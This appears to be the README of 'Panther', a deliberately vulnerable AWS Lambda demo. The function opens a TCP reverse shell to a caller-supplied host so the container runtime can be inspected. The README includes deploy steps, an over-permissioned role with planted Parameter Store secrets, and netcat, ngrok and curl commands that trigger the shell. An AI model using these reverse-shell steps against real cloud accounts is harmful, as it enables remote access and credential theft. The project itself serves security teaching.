# Puma Prey Panther

Panther is a Node.js function that can be deployed to the AWS to establish a TCP reverse shell for the purposes of introspecting the Lambda container runtime.

## Installing Prerequisites

* [AWS Command Line Interface](https://aws.amazon.com/cli/)
* [Node.js / NPM](https://nodejs.org/en/download/)

## Deploying The Function and Resources

```bash
cd /PATH/TO/panther
aws configure
npm install

# Optional: Run the Lambda in a VPC.
export IN_VPC=true

# Optional: Create protected S3 bucket that the Lambda execution role has access to.
export WITH_BUCKET=true
export BUCKET_SUFFIX=$(uuidgen | cut -b 25-36 | awk '{print tolower($0)}') # Save this value for future sessions.

npx serverless deploy
```

Record the API key provided in the output:

```bash
Serverless: Stack update finished...
Service Information
service: panther
stage: dev
region: us-east-1
stack: panther-dev
resources: 14
api keys:
  panther: YOUR_API_KEY
```

In addition to deploying the function, this will create a private S3 Bucket with an image. The Lambda role will have unnecessary permissions to access these resources as well as to an AWS Parameter Store path to demonstrate the damage that can be done by exfiltrating credentials from the runtime environment.

To store a secret in the aforementioned Parameter Store path, run the following:

```bash
aws ssm put-parameter --name /panther/database/user --value "panther_user" --type SecureString
aws ssm put-parameter --name /panther/database/password --value "RG9ncyBhcmUgb3VyIGxpbmsgdG8gcGFyYWRpc2UuIFRoZXkgZG9u4oCZdCBrbm93IGV2aWwgb3IgamVhbG91c3kgb3IgZGlzY29udGVudC4=" --type SecureString
```

## Testing in AWS

If you have [Netcat](http://netcat.sourceforge.net/) and [ngrok](https://ngrok.com/) installed, you can use this script:

```bash
script/panther --url-id YOUR_API_GATEWAY_ID --api-key YOUR_API_KEY
```

Alternatively, you can do this manually by setting up a Netcat listener like so:

```bash
nc -l 4444
```

To make your listener accessible from the public internet, consider using a service like [ngrok](https://ngrok.com/):

```bash
ngrok tcp 4444
```

Invoke your function, supplying your connection details and API key:

```bash
curl 'https://YOUR_API_GATEWAY_ID.execute-api.us-east-1.amazonaws.com/dev/api/Panther?host=YOUR_PUBLICLY_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER' -H 'X-API-Key: YOUR_API_KEY'
```

Your listener will now act as a reverse shell for the duration of the function invocation. You can adjust the function timeout in the serverless.yml file, though it cannot be extended past 30 seconds as it is attached to an API Gateway.

## Teardown

```bash
npx serverless remove
```

## Running Locally

```bash
npm start
```

## Testing Locally

```bash
curl 'http://localhost:3000/api/Panther?host=YOUR_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER' -H 'x-api-key: offlineKey'
```

## Linting

```bash
go get -u golang.org/x/lint/golint
npm run lint
```

## Serverless AWS NodeJS Template

Creating the original function template using the serverless framework.

```bash
cd src
serverless create --template aws-nodejs --path panther
```

## Exploring Further

Refer to [Serverless Docs](https://serverless.com/framework/docs/providers/aws/) for more information.
